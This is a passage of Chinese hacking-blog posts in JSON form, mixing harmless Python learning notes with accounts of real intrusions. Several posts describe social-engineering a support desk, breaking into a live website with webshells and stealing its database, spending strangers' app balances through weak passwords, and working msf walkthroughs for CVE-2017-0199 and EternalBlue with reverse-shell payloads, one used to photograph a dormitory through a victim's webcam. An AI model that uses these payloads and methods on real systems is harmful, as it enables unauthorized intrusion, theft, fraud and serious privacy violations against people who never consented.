通过发现这个接口数据“创蓝营销平台”，拟定思路，尝试社工客服之 因为聊天记录都已经找不到了，只能大概叙述下。 百度这个“创蓝营销平台”，找到了这个平台的官网，官网首页有客服的联系窗口，直接打开询问http://xxx.xxx.xxx.xxx/msg/index.jsp这个平台属于你们吗？ 客服说是的，那么好办，直接抛出问题：我是公司新到的广告推广，上一任同事走了给了个短信平台属于你们平台，给了我登录的账号密码，可是登录不上，请问是为什么呢？ 。。。。。 这个平台的客服很热心，告诉我不是修改了密码的问题，说是什么缓存，只要清除一下就可以登陆，那就好，直接把账号发过去，请客服清除了缓存，登录成功之。 客服真的好评，问题很少，很干脆：） 登陆后发现，发现可以获取到管理员的账户密码，原来后台是通过短信获取的动态密码，admin也是如此，直接点击获取动态密码，在短信平台获取到动态密码，成功登录。 看了看后台，真的没什么可以利用的地方，基本没有上传和可以任何getshell的地方，但是还是重新夺回了点权限，保住短信平台即可！剩下的还是算了吧，收集好证据资料，全部发给了朋友，剩下的事情我也做不了什么了。 —总结： 一句话：不要放弃，万一找到突破口了呢？","tags":[{"name":"渗透实战","slug":"渗透实战","permalink":"http://fjhack.me/tags/渗透实战/"}]},{"title":"记一次漫长的渗透","date":"2017-06-02T09:25:30.837Z","path":"2017/06/02/12/","text":"目标站点：www.xxxx.cn 类型：非法基金盘【类似于MMM】 架构：IIS8.0+aspx+win2k12+mssql 手动测试常见漏洞，没发现明面的漏洞，发现有上传点，利用burp抓包分析，上传会返回路径。OK 修改数据包中文件名后缀 asp 状态:404cer 状态:404asa 状态:404aspx 状态:200 最后发现只有aspx可以成功上传，访问却发现404，按道理不应该会404服务器都给出路径了，随便写个内容为123的aspx脚本上传，发现可以访问并且解析。 那么直接替换为一句话试试，上传后菜刀连接，相应状态码为200，难道有waf阻碍连接？ 直接访问上传的shell地址发现编译错误，估计是马儿的问题。 换个变形一句话试试，用砍刀成功连接。 利用cmd查看一下权限，发现权限很小iis权限，但是可以执行cmd，tasklist查看一下进程。发现有云盾和主动防御的进程，看了下端口开启了1433，那么就是mssql了，翻了翻目录发现D盘的目录权限还是很大的可以任意增删，C盘只有部分目录的权限，没什么用，有一点很奇怪就是网站目录下的Views文件夹通过url访问竟然访问不到，后面才访问到了估计是管理员做了什么限制，这个后面说，先不管上个大马看看，进入大马准备提权，查看了下系统的基本信息，还有服务器补丁的情况打了将近两百 个补丁，利用exp对比工具对比出没有打的补丁 对比情况123456789101112KB3139914|MS16-032KB3124280|MS16-016KB3134228|MS16-014KB3079904|MS15-097KB3077657|MS15-077KB3045171|MS15-051KB3000061|MS14-058KB2829361|MS13-046KB2850851|MS13-053 EPATHOBJ 0day 限32位KB2707511|MS12-042 sysret -pidKB2124261|KB2271195 MS10-065 IIS7KB970483|MS09-020 IIS6百度找找exp，事实发现，试了几个exp发现只有MS12-077和MS6-014，可以直接执行，但是执行‘net user’等命令就却无反应，查看进程exp确实在进程中，有可能是杀软拦截卡死在进程中了吧，可惜手里没有免杀的exp。 GG，换思路 mssql数据库一般会有数据库配置文件，翻了翻目录发现配置文件， 有趣的是，服务器的密码和数据库的密码竟然是一样的密码，只可惜管理员刚好在线，上去一秒中都没有就被挤下来了，估计管理员一直在线，忘记利用cmd查看管理员是否在线了。 吸取了教训，希望管理员没有改密码，先利用query user 命令查看管理员是否在线，这时候没在线了。 尝试再次登录服务器，却发现管理员改了密码，看样子这条路GG，那还是继续从数据库入手，数据库权限sa权限，利用webshell本地登录看看，发现登录不上，尝试利用NAVICAT外联，成功登录，翻了翻裤子，找到了管理表，pass列的数据全部是一致的，发现密码是一种从来没见过的加密，问朋友可能是自己写的盐值加密方式。 时间晚上一点多了很晚了，主要是这个站动不动就封IP，其中管理员还关闭了网站维护了段时间，所以搞得进度很慢，下载了些感觉比较有用的东西 比如 【一天进账几十万的账单】 一些身份信息图片等等准备第二天再搞，第二天上线发现数据库也连接不上去了第一反应是不是数据库密码被改了，上了webshell看了下数据库的配置文件发现并没有被改，既然数据库文件没有被改那么是外联被关闭了？既然密码通用数据库和服务器，那么试试域名邮箱是否是这个密码，尝试登陆发现密码正确，可是有个二级密码，还没想明白二级密码是什么，在登录的时候密码就被改了。 翻了其他的目录，发现昨天传的一句话都被管理员打包成压缩文件，估计管理员要进行排查，暂时先不管，因为大马放在其他的目录，尝试提权，试了几种提权， 比如NC反弹，失败 想放dll后门，但是发现没有run目录的权限su提权 失败 找敏感目录，失败 替换cmd，失败 网站只支持aspx脚本，想传ap大马，失败！ 等等 还有几个思路不知可不可行，虽然没有尝试，但是下次会试试。 比如执行远控马，但是不知道iis权限是否可以执行，而且手里也没有免杀马。 自己写个注入页面，因为数据库是sa权限的，但是没有写过也不会写，注入只写过php包含，怕写坏所以没有写，而且还有双waf，通过观察发现，这个网站的脚本格式全部是“cshtml”的后缀，没见过这种后缀，后来百度才发现这种格式是MV3C之后新增的文件，跟apx很像，但是两者的解释引擎不同，只有MV3C或者版本更高的框架才能还用。 难怪那时候的马儿会发生错误，原来是解释器的问题。 提权这块也不怎么熟练，所以暂时先放弃了先想办法增大权限吧，但是数据库连接不上，所以扫了下端口发现开放了1434端口，原来管理员改了端口号，尝试外联还是失败，这时候想起来菜刀有个本地连接数据库的功能，用菜刀尝试连接，发现竟然连接上了。重新取得数据库权限，既然是sa用户那么应该可以直接调用cmdshell进行提权，先恢复xpshell，在执行命令查看，发现竟然被降权了。 看样子管理员是有基本功的，虽然仍然可以进行增删改查，但是又断了一条提权的思，拿到数据库权限就想拿到后台权限，但是管理员密码是没见过的密文，通过查看会员用户表发现也都全部加密了，就想是否可以把这个密码替换成一个简单的密文了，【自己的账号明文是123456】，按道理是可以的。有了思路，可是没有后台的地址，这时候着手研究源码，源码的“Views”目录里发现了管理员的后台地址，但是发现通过url访问都是404，明明存在这个目录为什么是404呢，这点不太明白，我登录自己的账户发现登陆后的目录页面直接跳转到“Views”目录，估计是源码做了调用设置，那么对着网站目录结构，一点一点终于猜出了网站的后台。 看到后台傻眼了，获取动态密码？想了想难怪账户名都是手机号而且密码都是一样的密文，原来是利用短信发送接口，实时的密码！测试了几个伪账户和常见漏洞发现行不通，想应该短信接口的数据也保存在数据库当中啊，翻了翻数据库果然翻到了，而且还有admin的密码，不是动态获取的密文。 连接过去，登录失败。 失败的开始： 想了想既然admin的密文不是动态密码，那么是不是替换admin的密文就应该可以登录呢，找了找sql语句，复制了自己的密文，进行执行，这时候又傻眼了 怎么会超出数值表呢，到现在还没弄明白，因为没学过数据库所以不明白。问问了朋友都说不知道，换了几款菜刀都是超出数字表值，用砍刀和开山斧，xise，发现没有数据库管理功能，还试了蚁剑，倒是可以连接上数据库，但是一直刷不出表，执行SQL语句也卡死了。正准备想办法的时候，因为和朋友一起搞，朋友说是不是替换成0那么密码就是不加密呢，我想了想，这应该行不通，毕竟是加了算法，这样加入的话一样是加密，就算行得通怎么改回来呢。 刚准备给朋友发信息，发现朋友已经改好了，进行登录，发现果然不行，而且改不回去了，这下真的GG了，研究了很久都没有找出解决数值的办法，最后想到，为什么不直接替换admin_user表中的数据，把其中的一个手机号替换掉就行了，这也是后话了，登录不上也没办法修改的时候，只希望管理员第二天没发现吧，取前38位密文给它改回去这样看数据库不仔细看的话看不出弊端，当然，事实发现这是自我娱乐。 第二天发现，所有的shell全部被管理员弄得干干净净，而且上传点虽然没被修复，可是做了目录限制，禁止执行脚本，试了很多方法没办法突破，最后发现还遗留一个21端口，也就是ftp ftp可以匿名登录，也可以上传和删除权限，可惜目录做的很死，是个C盘共享目录，也没法利用，渗透就此结束，虽然备份了很多资料证据，其实说到底就是自己的疏忽大意和经验问题，所以进行总结这次失败，本来可以登录后台，没准可以拿下服务器。 渗透总结： 登录3389的时候，先确认管理员是否在线，或者等到凌晨3-4点再登录，如果这么做的话估计早就成功了。 得到权限的情况下，先巩固好自己的权限，比如上面我可以做一个包含，把一句话写入到网站的logo图片中，然后再每个文件中插入包含代码还有备份也要修改。 多收集一些免杀的工具，如远控，exp，webshell等等 多关注管理员的动向，管理开始打包马的时候，说明已经开始收集样本，他知道你进来了，而且我估计上传漏洞的目录早就被管理员加了禁止执行脚本，只是自己没去检测。 进行下一步的时候要事先计划好，不要莽撞行事，上面的例子很明确。 分析了下管理员的水平，应该是运维出生，每次我走哪他就赌哪里，安全意识很高，但是估计没有apx脚本编程经验，不然他可以修复那个漏洞。 这是以前帮一个朋友渗透的一个非法站点，这类站点很多，打着投资的名义非法集资，因为新法案的原因，有很多敏感内容，固打码。不要问我为什么搞他，就是想搞他！这个站现在也已经死了，域名也换了。所以爆菊的朋友可以出门左转，【毕竟爆菊大牛太多了！】 特此声明，请勿随意转载！谢谢。 这是一个失败的例子！写出来的原因是自己碰到的一些问题，至今也没法解决，希望有知道的表哥能够告诉下我，感激不尽，让自己学到更多的东西，也当做一个教训告诉自己要记住这些失误，不然可能就是另一个结果，不是吗？文章有很多地方没办法详细的说明，能看懂的可以当做经验，看不懂的就当做故事吧，哈哈！ 当然这只是上部分，还有下部分，总不能放弃吧！:)","tags":[{"name":"渗透实战","slug":"渗透实战","permalink":"http://fjhack.me/tags/渗透实战/"}]},{"title":"Python之路---简单的网络安全答题小脚本","date":"2017-05-15T16:46:04.698Z","path":"2017/05/16/11/","text":"今天下午在自己的努力下，完成了自己的第一个python的小程序，也可以叫做小游戏:)运行时的截图 写起来非常简单，没什么技术性，只是觉得非常好玩，因为当做练手，所以用的都是最基本的几个BIF，raw_input,print,if判断等等。 大致的流程就是先把题库导入进去，然后让玩家输入答案，最后在利用判断直接判断玩家输入的答案是否正确，是不是很简单？哈哈，确实很简单，但是还是花了一两个小时的时间，毕竟编程太菜,可写出了第一个属于自己的游戏还是很骄傲！加油！ 总结：感觉自己做了很多无用功，应该可以简化很多的，if 分支也用的非常多，个人感觉应该可以一次判断出所有的变量，可惜不会，只能日后慢慢完善了！ 下载地址如下：http://fjhack.me/game.py","tags":[{"name":"python 小游戏","slug":"python-小游戏","permalink":"http://fjhack.me/tags/python-小游戏/"}]},{"title":"友宝活动漏洞，免费喝饮料","date":"2017-05-07T14:53:16.948Z","path":"2017/05/07/10/","text":"正文今天朋友告诉我说友宝自动售货机与wopay有合作，基本各大高校都是使用这种自动售货机，简单就是买一个手机号，然后下载一个沃钱包的app，利用手机号登录APP，然后手机号里有一分钱，直接利用一分钱的余额进行支付，有人专门出售这种手机号，原价成本非常低，不到2￥，可购买的单件商品是6￥，也就是常说的“撸羊毛”，那么就是2￥买6￥的商品，这么好的事情当然得尝试一下：）于是找朋友弄了几个这样的手机号，测试发现，每台手机的购买次数只有两次，也就是说，一个手机只能登陆两个号购买，当然，通过刷机恢复出厂值，或者修改框架等一些手段是可以实现一机多刷。具体太麻烦没有进行尝试，有兴趣的可以自己尝试。 手机号：123456789101117196527941----xxxx1111----xxx111----17196499747----xxxx1111----xxx111----17083244844----xxxx1111----xxx111----17196527437----xxxx1111----xxx111----17083247864----xxxx1111----xxx111----17185151541----xxxx1111----xxx111----小霸王刚刷的小米系统，经不起折腾：） 重点来了，通过发现，所有手机账户的登录密码和支付密码都是一摸一样的，那么岂不是可以登陆到其他的账户？虽然这样成本已经非常低了，但是再低也是￥￥，尝试免费购买的想法，问了下朋友，朋友说这是现做的虚拟账户，应该不会有这样的问题。然而心不死，手动猜了十几个账户，每台手机的登录都会有限制，发生登陆限制清除一下缓存数据就可以，发现成功登陆10个，5个账户是有余额的，把室友的手机全部借了过来，测试发现成功购买虽然成功率有点低，但是终究还是成功了，虽然不知道是谁的账户，只能算倒霉了。 那么更加淫荡的想法来了，如果抓到了app的登录包岂不是可以批量跑一波？因为不知道这样是不是合法的所以没有进行尝试，利用burp或者手机的抓包软件应该就可以完成，思路也就是差不多的，懂的人自然可以搞定。炎热夏日，来一瓶可口的脉动岂不美滋滋？各位仁兄，只能帮你们到这里了，剩下的自己解决吧。没什么技术含量，只是觉得挺有意思。友宝官方别找我，只能怪弱密码的错。 总结一点，思路很重要：）","tags":[{"name":"实战 好玩的","slug":"实战-好玩的","permalink":"http://fjhack.me/tags/实战-好玩的/"}]},{"title":"Word漏洞msf复现与浅析","date":"2017-05-03T15:02:16.539Z","path":"2017/05/03/09/","text":"前言漏洞编号：CVE-2017-0199 影响版本：所有版本office word 漏洞危害：受害者打开含有危险代码的word文档，利用msf可以获取到一个system权限shell。 修复方式：升级office，下载相关补丁。 个人浅析这个漏洞发布的挺早，但是一直没有时间去真正的研究，昨天在和朋友Fanx-jk的交流研究下，成功在本地复现了这个漏洞，相对比smb445远程溢出漏洞的主动攻击，这个word漏洞显然显得有些被动，需要主动去钓鱼，但是有一点比较好，那么就是国产的杀软大部分还是没有检测出来的 ：） 简单来说就是构造一个含有外部链接文件的wrod文档，然后发给受害者，当受害者打开这个word的时候，会自动下载第三方链接的文件内容并执。 poc：1234&lt;script&gt;a=new ActiveXObject(\"WScript.Shell\");a.run('%windir%\\\\System32\\\\cmd.exe /c calc.exe', 0);window.close();&lt;/script&gt; 这是网上流传比较广的一个poc，分析发现是一段VBS的脚本，其功能就是在计算机上调用shell打开calc.exe这个计算器。把这段代码写入到一个rtf文件中，并放在远程web服务器上，前提是服务器开启webdav，kali下自带阿帕奇服务，然后在word的插入对象中，把刚刚的rtf文件添加进对象，因为Office通过 URL moniker来发送远程的请求，所以，它会自动去下载那个RTF文件，而这个文件包含的是一个VBS的脚本，URLmoniker会通过content-type文件扩展把这个文件识别为HTA文件，然后系统中专门用来识别HTA文件的mashat.exe会自动匹配脚本数据，并且将它执行，那么那段VBS脚本也被执行了，但是需要手动去触发这个hta文件，利用winhex软件通过修改文件的十六进制代码，可以实现自启动1\\object\\objautlink\\rsltpict修改为\\object\\objautlink\\objupdate\\rsltpict这些是我看了一些大牛们写的资料后简单的个人理解，但是针对于这个漏洞，不仅仅是可以调用计算器那么简单，通过修改vbs代码，我们几乎可以干任何事情，有大神写出了用msf生成的word，打开即可返回一个shell。 URL moniker：（这是一个由系统生成的对象，可以利用该对象去另一个对象中获取数据） content-type：（Content-Type，内容类型，一般是指网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件） HTA：（HTML应用程序） 利用msf反弹shell利用工具：kali下的msf，msf需要更新到最新版本，不然无法开启hta服务。 我这边用的是ssh，因为另一台电脑装了kali最新版，所以直接开个ssh。 首先cd 到123/usr/share/metasploit-framework/modules/exploits/windows/fileformat 目录下wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb然后执行wget下载payload，然后切换到123/usr/share/metasploit-framework/data/exploits/wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf wget下载exploit。 进入到msf，使用reload_all，刷新一下下载的载荷。 然后开启hat服务12msf &gt; use exploit/windows/misc/hta_server msf exploit(hta_server) &gt; run 上面的命令相当于开启了一个web服务，并且提供了一个可供下载的hat文件。http://10.20.79.234:8080/yETy5CKuqcXljn.hta 加载exploit12345use exploit/windows/fileformat/office_word_hta //加载exploitset TARGETURI http://10.20.79.234:8080/yETy5CKuqcXljn.hta //加载刚刚生成的hta文件set FILENAME word.doc //设置生成doc文件的文件名run //生成一个嵌套代码的word文档。cp /root/.msf4/local/word.doc /word.doc //将生成的文件拷贝到根目录。 生成的word文件在root下的一个隐藏目录，我们直接把文件cp到桌面，发给别人打开即可获取一个shell，shell是system权限，上远控，交互shell，几乎想什么就什么，这里就不多做解释，因为我也没有实战 发给朋友还被识破了计谋，尴尬！：( 返回的shell是以session方式保存的，所以可以同时控制多个shell。 总结：这个漏洞总体来说，杀伤力还是非常强的，唯一的不足是还没研究明白怎么打开后显示正常内容，晚点看大牛们的文章研究一下，研究出来的话会更新，谢谢各位大牛分享的文章知识，我也要好好努力！ 最近爆的漏洞挺多的，例如stur2-045-046，phpcms，snmp，wordpass。。。不知道是巧合还是特意的呢？：） 用一句话总结：打开这个word，你的电脑就是我的了。 后续关于显示 参考文章：https://baijiahao.baidu.com/po/feed/share?wfr=spider&amp;for=pc&amp;context=%7B%22sourceFrom%22%3A%22bjh%22%2C%22nid%22%3A%22news_3028699747011659098%22%7D http://www.360zhijia.com/360anquanke/190384.html http://www.tuicool.com/articles/JFvUZvU","tags":[{"name":"kali CVE-2017-0199","slug":"kali-CVE-2017-0199","permalink":"http://fjhack.me/tags/kali-CVE-2017-0199/"}]},{"title":"Windows漏洞实战，盲打女寝","date":"2017-04-16T15:20:33.463Z","path":"2017/04/16/08/","text":"准备环境kalilinux 监听机，或者装有msf和nmap的linux即可，桥接物理机网络win03 攻击机 python2.6 + pywin32 环境 桥接 exp下载链接 https://github.com/misterch0c/shadowbroker12python-2.6.6.msihttps://www.python.org/download/releases/2.6.6/ 123pywin32-221.win32-py2.6.exehttps://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/ 靶机：不用本地的靶机，虽然测试成功了，但是要实战才有意思。所以扫本地的C段。 配置攻击机1【win2003】把下载的exp压缩包中Windows目录解压到攻击机上，不要解压到有中文目录的路径，不然会报错，解压完后，我们在Windows目录下新建一个空目录“listeningposts”，为什么要建立这个目录，因为fb.py中有个遍历目录的参数，对应的就是这个目录，默认是没有的。 利用nmap扫下C段，看有哪些机器开了445端口，主要针对win4 64 的主机进行试验。 1nmap -p 445 -O 10.20.70.0/24 扫描整个C段开放445端口的主机，并且探测系统版本。 针对目标主机 10.20.70.x 然后运行fb.py脚本，设置参数 攻击目标 [?] Default Target IP Address [] : 10.20.70.x 本机IP[?] Default Callback IP Address [] : 10.20.88.207 是否重定向[?] Use Redirection [yes] : no 是否输出日志[?] Base Log directory [D:\\logs] : no 根据提示，新建一个项目，然后默认设置，直到设置use eternalblue 设置好选择Yes,然后一路回车默认，直到出现选择针对的目标系统和加载的MODE 这里我都选择1，因为我针对的系统是X64的win7，MODE用本身自带的一个fuzz框架。然后一路YES回车，直到出现 输入 use doublepulsar 然后一样默认设置回车yes，直到出现要我们再次设置攻击目标的信息，选择SMB服务，x64系统，利用RunDLL模块。 到这里，配置这个exp已经差不多了，这时候打开kalilinux，利用msf配置一个DLL的后门，因为刚才我的fb.py利用的模块是RUNDLL。 配置攻击机2【kalilinux】利用msf生成一个x64位的dll后门 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.20.89.101 LPORT=5555 -f dll &gt; s.dll 然后msfconlse 打开msf 设置参数开启侦听12345678msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 10.20.89.101lhost =&gt; 10.20.89.101msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit 设置完kalilinux，把刚才生成的dll后门，放到win03攻击机1的C盘目录下。 然后在攻击机1下设置开始攻击。 这时候，kalilinux下反弹了一个shell回来,成功了，HELP一下，看看这个shell有什么功能 功能挺多，运行一下截图桌面的命令。screenshot 原来在看爱奇艺 看到拍照功能，试验一下。webcam_snap竟然一不小心盲到了女寝的C段，学校的wif IP是随机分配的，好吧，我不是有意的，因为隐私问题固打码，看样子妹子也是一脸懵逼，估计摄像头的灯亮了下。:P 运行shell，获取一个system的权限，利用命令开3389，并且创建隐藏账户 功能还有很多，可以利用system权限远程下载一个远控等等，自己挖掘,这里就不继续演示了。排版可能有问题，凑合看吧！ 总结这个漏洞基本是通杀的，真的非常可怕，分析了下源码发现全是自带的库，无奈编程太菜，看了下网上的分析，发现这个漏洞也是基于堆栈的底层溢出，底层的东西我相信还有更多的漏洞没被挖掘出来，无法想象真正的黑客组织手里的0day有多可怕，也让我看到了差距有多大。 两个字总结：震撼！ 注：图片本人已经删除了，虽然打了马赛克，但是对于别人造成的影响还是有的，如果在上面的文章中对其事件人物造成了影响，在这里说声抱歉，敬以歉意。虽然是实战但是涉及到一些隐私问题，一张打了马赛克的照片，和关了爱奇艺，其他本人保证绝对没有做！希望其他论坛和网站转载了本篇文章的朋友请删除相应的内容，再次申明，其他论坛转载文章发生的法律关系与本人无任何关系！我写这篇文章的目的不是为了教大家怎么去入侵，虽然标题有点扎眼：）只是希望在安全问题这个方面，引起大家的重视。 对于这个漏洞的防御方法，我的建议是开启防火墙，做一个tcp连接的入站规则阻止，或者直接卸载掉445端口， 参考文章：http://www.jb51.net/hack/95788.html http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=502990295&amp;idx=1&amp;sn=181c1e9b01854b87d3d4752c593c4dd4&amp;chksm=700a2442477dad54b542427edad3ec16df8cde9f470ee4e6f4597d4866d64b405801baf3d799&amp;mpshare=1&amp;scene=23&amp;srcid=0415ThTsF2Uj2kCRQZeTr8Bh#rd","tags":[{"name":"kali CVE-2017-0148","slug":"kali-CVE-2017-0148","permalink":"http://fjhack.me/tags/kali-CVE-2017-0148/"}]},{"title":"你好！新的世界","date":"2017-04-10T14:25:53.055Z","path":"2017/04/10/07/","text":"看完猪猪侠一段在先知白帽大会的演讲视频，深受感触，说实话，和他比起来真的是感觉自己是个什么都不懂的小白，完全是两个世界的人，我很多原理不懂，用的很多入侵思路方式都还是十几年的那一套。当然，很多人依然再用这一套万年不变的思路！就算是培训也是，如果跟不上时代的步伐，那么自己永远都没办法进阶到另一个阶段，或许一辈子都是个只会用工具脚本小子，有的人会说，工具玩的6也是很厉害的大神，确实，精通各种渗透工具配合使用，收集各种利用漏洞姿势确实很厉害，可是，如果你不改变，不去了解底层，不会研究poc，exp等等，终究会被淘汰，当然，这只是我自己的个人观点，就算结局没这么糟糕，我相信，一个写工具的人和一个只会使用工具人，世界观都是不同的，而且前者会一直走在后者的前面。 记得朋友跟我说过他的一个想法 他说以后的渗透都是全自动的智能渗透，这个载荷也许只是一个软件，或者是一台集成了很多功能的一台终端。利用大数据对接，可以一键收集信息，一键模拟攻击，甚至可以一键渗透提权等等，全部只需要人工智能帮你来完成，当时我听到他的想法觉得挺搞笑的，感觉有点痴人说梦，后来细想下并且找了一些深度学习的资料，发现他不是在开玩笑。人工智能已经发展了一段时间，最著名的就是那个“阿尔法狗”，我相信，不需要多久，也许就是几年的时间【或许已经有了】，自动化攻击就会非常成熟，metasploitabls不就是个例子么？傻瓜式的加载对应漏洞的exp，一键攻击。猪猪侠提倡的fuzz测试不就是个例子么？纯自动化的攻击，测试，无论是成本和时间都会降低非常多。 而且现在都是自动化运维，我相信很多人在渗透测试的时候都碰到过waf防护软件或者是防火墙，面对一个网站如果有CDN，应用层waf，云端waf的时候会发现很难下手，虽然可以绕过去，但是大大的加大了渗透的成本，因为据我所知，现在的waf虽然还是基于正则匹配，就算你绕过了一种规则，还有无数的规则约束着你。而且waf的种类也越来越多，物理层设备waf，应用waf，服务器waf，云端waf等等，前段时间我自己研究绕一些很过气的应用层waf注入，绕了几天，虽然绕过了匹配规则，可是发现绕过后不会写成sqlmap的tamper，得自己花费大把的时间进行手工注入。所以，不会写脚本是一件很让人伤脑筋的事情，当然，如果是一个会写脚本的大牛，那么，工作量可以缩短很多很多倍，而且，也更加的简单，甚至可以做到一键绕waf，根本不需要手动去绕过waf的匹配规则，只需要写个脚本，测试waf的规则对应写出脚本就行。 但是工具是人写出来的，太依赖工具反而不行，当一个新漏洞出来的时候，人们首先想到的是有没有出exp，或者是利用工具，反而那些形成原理poc不再被大多数人关注，我以前就是如此，为了一个exp会花几个小时去谷歌百度，到最后找到后狂刷一波，感觉自己已经完全了解这个漏洞了。可是事实并不是这样，你的确会利用了，如果漏洞稍微变了下呢？感觉自己就蒙了，连触发点，形成原理都不明白，然后又会去找exp，这是很可怕的。 说了这么多，其实只是想让更多人了解到，时代在进步，思想还是老套的是迟早会被淘汰的。我也从猪猪侠的演讲中找到了学习的方向和自己的不足，确实如此，web安全只是计算机体系中一个微不足道的东西，如果要让自己能够懂更多的东西，那么需要学习更多的东西，上到前后端，应用开发，各种框架开发下到系统底层结构，汇编，数据传输和二进制等等，不说精通，但是也要了解，等自己对网络世界【或者计算机世界】有一个全新的概念的时候，再回来看web安全，也许会有另一种感觉。 学习计划：1.首先必须学会一门或者多门语言，从python开始，毕竟大部分的poc和exp都是基于python的，至少不会发生大牛发出的exp不会使用和分析判断的事情，然后再尝试自己写类似的exp脚本。最后在自己做代码审计挖属于自己的漏洞！ 2.坚持关注时事漏洞的进展状态，今天爆出的漏洞，过几天才从别人口里知道，这是件很LOW的事情，关注其他方向的发展，比如人工智能等等！ 3.学习kalilinux，学习他人的新思路，更加要学会安全防御，只会攻击不会防御修复，都是白学！ 4.重新学习底层的知识：tcp/ip协议，底层二进制等等。 总结写的文章比较烂，没有文笔这是没办法的事情，但是尽量把自己的想法用语言表达出来，制定的计划不多，也比较杂，但是自己要完成确实是一件挑战，因为以前制定过类似的计划，可惜过了一段时间就GG了，这很丢人，所以，这次一定让自己沉下心安心搞学习，低调求发展，不要跟别人去谈什么理想，谈论别人多牛逼多牛逼，能日多少站，能黑掉什么。说实话，不如自己去做来的实际，不浮躁沉下心才是最好的。 至于为什么要写这个文章，虽然并没几个人看，但是至少给自己一个警钟—–跟不上时代的脚本，你就得被淘汰。 ：） 知识面，决定看到的攻击面有多大。 知识链，决定发动的杀伤链有多深。 —-猪猪侠 最后附上猪猪侠的视频链接，会学到很多很多东西！：http://www.huajiao.com/l/94991075 so Come on :)","tags":[{"name":"感言","slug":"感言","permalink":"http://fjhack.me/tags/感言/"}]},{"title":"Python之路---最简单的爬虫","date":"2017-04-08T16:46:33.997Z","path":"2017/04/09/06/","text":"前言在一位编程大牛朋友【确实很厉害】的监督和帮助下，终于写了自己的第一个非常非常简单的python爬虫,我对编程这块无论是php，python，汇编等等，懂得只是一点点皮毛，可以算是门都没入，看过很多教程，例如廖雪峰和小甲鱼的python教程，也学了一个学期的php，但是除了写个循环判断，和字谜小游戏之外发现自己啥都不会，所以，励志一定要学好编程，用猪猪侠的话来说，不会编程是一件非常丢脸的事情，的确如此，发现自己的不足，就要去完善，毕竟自己会写程序是件很有成就感的事情，那么先从爬虫开始吧！：） 正文先定一个小目标，比如，先利用python爬下百度的首页文件！ 先附上代码： 12345# -*-coding:utf-8 -*-import urllib2respone = urllib2.urlopen(\"http://wwww.baidu.com/index.html\")html = respone.read()print(html) 代码简单分析：urllib2是python自带的一个库，它的功能是获取urlopen函数的形式提供一个非常简单的接口，还支持http/ftp/Gopher协议 urlopen一般接收的三个参数，第一个是url，第二个是要传送的data数据，第三个则是超时设置1urlopen(url, data, timeout) 这里我们只要获取百度的首页，那么我们首先导入这个库，然后把 “urlopen”通过HTTP协议获取的值，赋给对象变量“respone”当我们利用urllib2库的时候，我们已经获取到了百度的首页文件内容，并且把获取到的内容赋值给了对象变量，可是如果我们直接打印这个变量查看内容是看不到百度首页文件的，直接打印输出变量的内容的话，会输出以下结果 1&lt;addinfourl at 139728495260376 whose fp = &lt;socket._fileobject object at 0x7f1513fb3ad0&gt;&gt; 很明显，此时urlopen的返回值ret_picUrl，其实是一个Object，而不是我们想要的首页内容，所以，我们需要加上一个read()函数，并且重新赋值输出。得到的内容是最直接的html代码 到这里，我成功地利用爬虫【虽然很简单粗糙】爬到了第一个页面，但是这个确实是成功了！但是，获取一个页面实在没啥意思，在大牛的指导下，进一步对这个简单的不能在简单的爬虫进行了小小的升级。 正则表达式正则表达式用百度的原话来说：又称规则表达式。（英语：Regular Expression，在代码中常简写为regex、regexp或RE），计算机科学的一个概念。正则表通常被用来检索、替换那些符合某个模式(规则)的文本。 对于一个这样的页面，如果我只想获取其中的一部分内容【比如标题，名称等等】，而不是整个爬下来，那么我们就需要在爬虫中添加正则表达式。 虽然听过很多次，而且也绕过一些正则匹配的waf，但是第一次写正则表达式还是写了很久很久，最后才勉强达到预期百分之五十的效果，毕竟写程序太菜了，我写的是爬百度贴吧某一篇帖子的第一页下所有用户名的名称，随便找了篇帖子，审查元素查看了下名称的位置，然后构造代码。 代码如下：123456789# -*- coding:utf-8 -*-import urllib2import re response = urllib2.urlopen(\"http://tieba.baidu.com/p/4886639100\")html = response.read()p = re.compile('&lt;a data-field=.*alog-group=\"p_author\" class=\"p_author_name j_user_card\" href=.*ie=utf-8.*fr.*=utf-8.*&lt;/a&gt;');result = p.findall(html)print(result) 代码简单分析爬虫大体和上面的爬虫差不多，但是导入了一个re的库，利用这个库我们可以添加变量对象为“p”的正则表达式，匹配具体内容就是匹配我们利用urlopen获取到的页面中其中带有 data-field=.*alog-group=”p_author” …..中的数据，然后利用findall()函数把规则应用到有页面信息的变量对象，全文匹配检索，最后输出检索出来的值。 小结第一次写正则真的好迷！试了很多匹配规则，也许是自己的语法问题，虽然爬到了信息，但是死活达不到自己想要的效果。所以只能利用最简单的“.*”规则进行匹配，而且爬到的中文名还以ASCLl编码显示，对变量编码也没有研究过，写这篇文章的时候已经是半夜两点了所以没有继续再深究了。但是自己不会放弃会慢慢完善自己的的第一个爬虫！ 最后得出一个结论：审计代码和写代码果然是两回事！ 附上爬出的数据截图 正则表达式语法表","tags":[{"name":"爬虫 Python","slug":"爬虫-Python","permalink":"http://fjhack.me/tags/爬虫-Python/"}]},{"title":"利用kali和pentestbox下的msf生成安卓木马","date":"2017-04-06T06:26:50.998Z","path":"2017/04/06/05/","text":"Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。 12kalilinux :msfvenom -p android/meterpreter/reverse_tcp LHOST=10.20.72.178 LPORT=5555 R &gt; /root/1.apk pentestbox :1msfvenom -p android/meterpreter/reverse_tcp LHOST=10.20.72.178 